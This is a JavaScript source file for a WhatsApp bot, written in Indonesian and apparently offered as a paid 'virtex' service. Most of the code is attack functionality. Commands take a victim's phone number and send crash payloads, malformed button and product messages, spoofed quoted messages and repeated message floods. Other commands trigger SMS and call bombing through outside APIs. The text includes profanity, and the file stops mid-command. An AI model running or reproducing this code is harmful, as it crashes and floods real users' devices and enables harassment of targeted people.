const { modul } = require('./module');
require('./config')
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const { ranzmods } = require('./scrape/ranzmods')
const { virusv1 } = require('./scrape/virusv1')
const { virusv3 } = require('./scrape/virusv3')
const { iphone } = require('./scrape/iphone')
const { philips } = require('./scrape/philips')
const { kanjut } = require('./scrape/kanjut')
const { doctext } = require('./scrape/doctext')
const { bugweb } = require('./scrape/bugweb')
const { sistem } = require('./scrape/sistem')
const { txtsw } = require('./scrape/txtsw')
const { virtexcrash } = require('./scrape/virtexcrash')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const { jadibot, conns } = require('./jadibot')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())
const dbspam = JSON.parse(fs.readFileSync('./database/spam.json').toString())
//==============================================================================================================
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {sticker: {},database: {},game: {},others: {},users: {},chats: {},...(global.db || {})}
//=============================================================================================================
module.exports = allan = async (allan, itsuka, chatUpdate, store) => {
try {
const body = (itsuka.mtype === 'conversation') ? itsuka.message.conversation : (itsuka.mtype == 'imageMessage') ? itsuka.message.imageMessage.caption : (itsuka.mtype == 'videoMessage') ? itsuka.message.videoMessage.caption : (itsuka.mtype == 'extendedTextMessage') ? itsuka.message.extendedTextMessage.text : (itsuka.mtype == 'buttonsResponseMessage') ? itsuka.message.buttonsResponseMessage.selectedButtonId : (itsuka.mtype == 'listResponseMessage') ? itsuka.message.listResponseMessage.singleSelectReply.selectedRowId : (itsuka.mtype == 'templateButtonReplyMessage') ? itsuka.message.templateButtonReplyMessage.selectedId : (itsuka.mtype === 'messageContextInfo') ? (itsuka.message.buttonsResponseMessage?.selectedButtonId || itsuka.message.listResponseMessage?.singleSelectReply.selectedRowId || itsuka.text) : ''
const budy = (typeof itsuka.text == 'string' ? itsuka.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const content = JSON.stringify(itsuka.message)
const { type, quotedMsg, mentioned, now, fromMe } = itsuka
const isCmd = body.startsWith(prefix)
const from = itsuka.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = itsuka.pushName || "No Name"
const botNumber = await allan.decodeJid(allan.user.id)
const ItsukaAllanBae = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(itsuka.sender)
const khususOwner = [botNumber, ...global.ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(itsuka.sender)
const khususSpam = [botNumber, ...dbspam].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(itsuka.sender)
const itsMe = itsuka.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = itsuka.quoted ? itsuka.quoted : itsuka
const mime = (quoted.msg || quoted).mimetype || ''
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
const hariRaya = new Date('January 1, 2023 00:00:00')
const sekarang = new Date().getTime()
const Selisih = hariRaya - sekarang
const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
const sender = itsuka.isGroup ? (itsuka.key.participant ? itsuka.key.participant : itsuka.participant) : itsuka.key.remoteJid
const isGroup = itsuka.chat.endsWith('@g.us')
const groupMetadata = itsuka.isGroup ? await allan.groupMetadata(itsuka.chat).catch(e => {}) : ''
const groupName = itsuka.isGroup ? groupMetadata.subject : ''
const participants = itsuka.isGroup ? await groupMetadata.participants : ''
const groupAdmins = itsuka.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = itsuka.isGroup ? groupMetadata.owner : ''
const groupMembers = itsuka.isGroup ? groupMetadata.participants : ''
const isBotAdmins = itsuka.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = itsuka.isGroup ? groupAdmins.includes(itsuka.sender) : false
const isAdmins = itsuka.isGroup ? groupAdmins.includes(itsuka.sender) : false
const sections = [{title: "Silahkan Pilih List DI Bawah Ini",rows: [{title: "Open Group", rowId: "gopen", description: " All Member Yang Dapat Mengirim Pesan"},{title: "Close Group", rowId: "gclose", description: " Hanya Admin Yang Dapat Mengirim Pesan"}  ] },]
//=============================================================================================================
const listMessage = {
text: `亗╭┬─────────────────┈ 
亗├ 「 Hallo 」 「 ${pushname} 」
亗├──────────────────┈`,
footer: 'ItsukaBot',title: `Setting Group ${groupName}`,buttonText: "Klik Disini!",sections}
//=============================================================================================================
const buttons = [{buttonId: 'buyspammenu', buttonText: {displayText: 'Buy Subscription'}, type: 1}]
const buttonMessage = {text: "Mohon Maaf Jika Sudah Membeli Subscription Virtex Anda Tidak Bisa Menugggunakan SpamMenu, Jika Ingin Menggunakan Fiture SpamMenu Silahkan Membeli Subscription SpamMenu",footer: 'GUNDAL GANDIL', buttons: buttons,headerType: 1}
//=============================================================================================================
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[itsuka.sender]
if (typeof user !== 'object') global.db.users[itsuka.sender] = {}
const chats = global.db.chats[itsuka.chat]
if (typeof chats !== 'object') global.db.chats[itsuka.chat] = {}
} catch (err) {
console.error(err)
}
//=============================================================================================================
if (!allan.public) {
if (!itsuka.key.fromMe) return
}
//=============================================================================================================
if (!itsuka.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(itsuka.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (itsuka.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(itsuka.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}
if (itsuka.sender.startsWith('212')) return allan.updateBlockStatus(itsuka.sender, 'block')
//=============================================================================================================
ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)
//=============================================================================================================
const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}
//=============================================================================================================
global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/amfcode/visits')
jumlahhit = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/papah-md${moment.tz('Asia/Jakarta').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}
if (command) {
 allan.sendPresenceUpdate('composing', from)
allan.readMessages([itsuka.key])
}
//=============================================================================================================
async function replyNya(teks) {
const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
const buttonMessage = {  text: teks, footer: "",  templateButtons: buttonsDefault, image: {url: ppnyauser}                                   }
return allan.sendMessage(from, buttonMessage) }
//=============================================================================================================
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,{compact: false,controlFlowFlattening: true,controlFlowFlatteningThreshold: 1,numbersToExpressions: true,simplify: true,stringArrayShuffle: true,splitStrings: true,stringArrayThreshold: 1});
const result = {status: 200,author: `allan`,result: obfuscationResult.getObfuscatedCode() }
resolve(result)
} catch (e) {
reject(e)
}
})
}
//=============================================================================================================
async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {listMessage: {title: title,description: description,listType: 2,productListInfo: {productSections: [{title: title,products: produk}],headerImage: {productId: productIdImg,jpegThumbnail: thumbnail},businessOwnerJid: ownerBusines},footerText: footer,}}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return allan.relayMessage(progene.key.remoteJid, progene.message, {messageId: ""})
//=============================================================================================================
}
switch (command) {
case 'menu':
jiren = ` 
╔═══[ 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 ]════
╠❏ Total Request Virtex ${jumlahhit}
╠❏ ɴᴀᴍᴇ ʙᴏᴛ : OTSUKABOT-MD
╠❏ ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟ ᴏɴʟʏ
╚═════════════════
╔═══[ 𝘼𝙆𝙎𝙀𝙎 𝘽𝙐𝙂 ]══════⊱
╠➤ addakses (628𝙭𝙭𝙭𝙭}
╠➤ delakses (628𝙭𝙭𝙭𝙭 }
╚═══════════════
╔═══[ 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐 ]══════⊱
╠➤ jadibot ( untuk menjadi bot wa  )
╠➤ listjadibot ( untuk melihat menjadi bot wa   )
╠➤ restart ( untuk restart bot )
╠➤ stats ( untuk melihat status bot )
╠➤ akses ( untuk beli akses )
╠➤ sewa ( untuk sewabot dalam grup )
╠➤ gclose  ( untuk tutup group )
╠➤ gopen ( untuk membuka group )
╚═══════════════
╔═══[ 𝘽𝙐𝙂 𝙑𝙄𝙋 ]══════⊱
╠➤ crash 628𝙭𝙭𝙭𝙭
╠➤ gascrashar 628𝙭𝙭𝙭𝙭
╠➤ gasbro 628𝙭𝙭𝙭𝙭
╠➤ gasbtt 628𝙭𝙭𝙭𝙭
╠➤ sendreaksi 628𝙭𝙭𝙭𝙭
╠➤ stickercrash 628𝙭𝙭𝙭𝙭
╠➤ vncrash 628𝙭𝙭𝙭𝙭
╠➤ santed30menit 628𝙭𝙭𝙭𝙭
╠➤ santed1jam 628𝙭𝙭𝙭𝙭
╠➤ jadivirtex Text
╚═══════════════
╔═══[ 𝘽𝙐𝙂 𝙀𝘼𝙎𝙔 ]═════⊱
╠➤ bug5 628𝙭𝙭𝙭𝙭
╠➤ bug10 628𝙭𝙭𝙭𝙭
╠➤ bug100 628𝙭𝙭𝙭𝙭
╠➤ bug1000 628𝙭𝙭𝙭𝙭
╠➤ santet 628𝙭𝙭𝙭𝙭
╠➤ brutal 628𝙭𝙭𝙭𝙭
╠➤ kill 628𝙭𝙭𝙭𝙭
╠➤ troli 628𝙭𝙭𝙭𝙭
╠➤ masuk_ke linkgroup
╚═══════════════
╔═══[ 𝘽𝙐𝙂 𝘼𝙏𝙏𝘼𝘾𝙆 ]═════⊱
╠➤ pe (attacker1)
╠➤ hallo_sayang (attacker2)
╠➤ bukadong (attacker3)
╠➤ isaltag (attacker4)
╠➤ colidek (attacker5)
╠➤ crashar (attacker6)
╠➤ sayangcrash (attacker6)
╠➤ catalog (attacker6)
╠➤ sistem (attacker6)
╚═══════════════
╔═══[ 𝘾𝙤𝙣𝙩𝙤𝙝 ]═════⊱
╠➤ 𝙗𝙪𝙜1 628𝙭𝙭𝙭𝙭
╚═══════════════
╠➤ ai ( create node js )
╚═══════════════`
itsuka.reply(jiren)
break
//=============================================================================================================
case 'grup':
allan.sendMessage(from, listMessage)
break
//=============================================================================================================
case 'gopen':
if(!khususOwner) return (`Lu Siapa?`)
idgrup = groupMetadata.id
allan.groupSettingUpdate(idgrup, 'not_announcement')
itsuka.reply(`「 Group Settings Change 」\n\nGroup telah dibuka oleh admin, Sekarang peserta dapat mengirim pesan !`)
break
//=============================================================================================================
case 'gclose':
if(!khususOwner) return (`Lu Siapa?`)
idgrup = groupMetadata.id
allan.groupSettingUpdate(idgrup, 'announcement')
itsuka.reply(`「 Group Settings Change 」\n\nGroup telah ditutup oleh admin, Sekarang hanya admin yang dapat mengirim pesan !`)
break
//=============================================================================================================
case 'akses':
itsuka.reply(`UNTUK AKSES BOT CHAT OWNER : wa.me/1`)
break
//=============================================================================================================
case 'sewa':
    itsuka.reply(`UNTUK SEWA BOT CHAT OWNER : wa.me/6`)
break
//=============================================================================================================
case 'buyspammenu':
allan.sendImage(from, 'https://arpaysmm.com/qris.png', `SIlahkan Scan QR Ini, Jika Sudah Lapor Admin`)
break
//=============================================================================================================
case 'masuk_ke': {
if (!khususOwner) return itsuka.reply(mess.owner)
if (!ItsukaAllanBae) return itsuka.reply(mess.owner)
if (!q) return itsuka.reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let resultny = args[0].split('https://chat.whatsapp.com/')[1]
let pler = await allan.groupAcceptInvite(resultny)
jumlah = '5'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
    allan.sendMessage({
text: 'BUG BY ItsukaAllan', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `AKWOWK KASIAN️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
}
break
//=============================================================================================================
case 'restart':{
 if (!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!isGroupAdmins) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
txts = `SUCCES KAK`
itsuka.reply(txts)
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = exec('pm2 restart all')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
}
}
break
//=============================================================================================================
case 'addakses':
if (!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!khususOwner) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!args[0]) return itsuka.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await allan.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
itsuka.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
//=============================================================================================================
case 'addspam':
if (!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!khususOwner) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!args[0]) return itsuka.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd2 = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye2 = await allan.onWhatsApp(bnnd2 + `@s.whatsapp.net`)
if (ceknye2.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
dbspam.push(bnnd2)
fs.writeFileSync('./database/spam.json', JSON.stringify(dbspam))
itsuka.reply(`Nomor ${bnnd2} Sudah Bisa Akses!!!`)
break
//=============================================================================================================
case 'delakses':
if (!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!khususOwner) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)  
if (!args[0]) return itsuka.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
itsuka.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
//=============================================================================================================
case 'tag': {
if (!khususOwner) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
allan.sendMessage(itsuka.chat, { text : 'HIDE TAG BY Itsuka' ? q : 'HIDE TAG BY Itsuka' , mentions: participants.map(a => a.id)}, { quoted: itsuka })
}
break
//=============================================================================================================
case 'test':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last}, {speed: 0,total: 0,times: {user: 0,nice: 0,sys: 0,idle: 0,irq: 0}})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
allan.updateProfileStatus(`${jumlahhit}`)
itsuka.reply(respon)
}
break
//=============================================================================================================
case 'jadibot': {
if (m.isGroup) return reply(mess.private)
jadibot(itsuka, m, from)
}
break
//=============================================================================================================
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(allan => allan.user).map(allan => allan.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await allan.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
allan.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
//=============================================================================================================
case 'ai':
const query_ = body.slice(6)
const response = await axios.get(`https://tools-amfcode.com/api/ai/bot.php?text=${query_}`);
const { text } = response.data
itsuka.reply(`${text}`)
break
//=============================================================================================================
case 'sms':
if(!q) return itsuka(`Contoh ${prefix+command} 8xx`)
const response_sms = await axios.post(`https://amfcode.my.id/2api/private/asu.php?target=${q}`);
itsuka.reply(`Success`)
break
//=============================================================================================================
case 'call':
if(!q) return itsuka(`Contoh ${prefix+command} 8xx`)
const response_call = await axios.get(`https://amfcode.my.id/2api/private/1.php?phone=${q}`);
const { message } = response_call.data.result
itsuka.reply(`${message}`)
break
//=============================================================================================================
case 'penjara':
if (!ItsukaAllanBae) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if(!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!q) return reply(`*Contoh* :\n.penjara namagroup`)
let cret = await allan.groupCreate(args.join(" "), [])
let response_itsuka = await allan.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response_itsuka}
`
reply(teks)
break
//=============================================================================================================
case 'sistem':
reply(sistem)
break
//=============================================================================================================
case 'pe':
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: ranzmods}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: virusv1}, type: 1}
]
const buttonMessage = {text: "Pe aja",footerText: 'Pe',buttons: buttons,headerType: 1}
allan.sendMessage(m.chat, buttonMessage)
break
//=============================================================================================================
case 'hallo_sayang':
kontolu = '``🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥``',
allan.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${bugweb}`,body: '🔥 𝐁𝐔𝐆 - 𝐓𝐁𝐂 - 𝐖𝐀 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
break
//=============================================================================================================
case 'bukadong':
ranzlistmessagebug = [
{
title: `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 ${ranzmods} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: ranzmods, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
allan.sendListMsg(m.chat, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, allan.user.name, `Hay Ngentod`, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, ranzlistmessagebug, m)
break
//=============================================================================================================
case 'isaltag': {             
let teks = philips
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
allan.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=============================================================================================================
case 'sayangcrash':               
asukonyol11 = { key: {   fromMe: false,  participant: `0@s.whatsapp.net`,  ...({ remoteJid: "" })  }, message: {  "imageMessage": {  "mimetype": "image/jpeg",  "caption": `© ISAL MODS WA`, "jpegThumbnail": thumb} } }
allan.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
break
//=============================================================================================================
case 'gasbro':
if (!text) throw `MANA NOMERNYA KONTOL`
gasbugpc = { key: {   fromMe: false,   participant: `0@s.whatsapp.net`,   ...({ remoteJid: "" })   },   message: {  "imageMessage": {    "mimetype": "image/jpeg",    "caption": `© ISAL MODS WA`,  "jpegThumbnail": thumb  }  } }
allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:gasbugpc})
txts = `SUCCES ✅`
itsuka.reply(txts)
break
//=============================================================================================================
case 'gasbtt':
if (!text) throw `MANA NOMERNYA KONTOL`
buttonspc = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: ranzmods}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: virusv1}, type: 1}] 
buttonMessagepc = {text: "© ITSUKA MODS WA",footerText: 'Pe',buttons: buttonspc,headerType: 1}
allan.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
txts = `SUCCES ✅`
itsuka.reply(txts)
break
//=============================================================================================================
case 'stickercrash':
if (!text) throw `MANA NOMERNYA KONTOL`
adehvn = {   key: {   fromMe: false,   participant: `0@s.whatsapp.net`,    ...({ remoteJid: "" })    },     message: {  "imageMessage": {     "mimetype": "image/jpeg",     "caption": `© ISAL MODS WA`,       "jpegThumbnail": thumb }    }  }
hey = fs.readFileSync('anjas.webp')
allan.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
itsuka.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
//=============================================================================================================
case 'crashar':               
asukonyol11 = {  key: {  fromMe: false,    participant: `0@s.whatsapp.net`,  ...({ remoteJid: "" })    }, message: {  "imageMessage": {   "mimetype": "image/jpeg",  "caption": `© ISAL MODS WA`,"jpegThumbnail": thumb} } }
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
txts = `SUCCES ✅`
itsuka.reply(txts)
break
//=============================================================================================================
case 'gascrashar':               
if (!text) throw `MANA NOMERNYA KONTOL`
asukonyol11 = { key: { fromMe: false,  participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },  message: {   "imageMessage": {    "mimetype": "image/jpeg",     "caption": `© ISAL MODS WA`,   "jpegThumbnail": thumb  }  } }
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
